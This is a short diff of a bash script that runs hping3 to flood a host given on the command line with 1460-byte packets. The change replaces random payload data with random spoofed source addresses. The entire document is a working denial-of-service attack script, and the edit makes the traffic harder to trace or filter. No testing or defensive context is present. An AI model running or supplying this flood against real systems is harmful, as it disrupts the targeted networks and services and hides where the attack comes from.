@@ -1,2 +1,2 @@
 #!/bin/bash
-hping3 --flood --rand-data -d 1460 "$1"
+hping3 --flood --rand-source -d 1460 "$1"
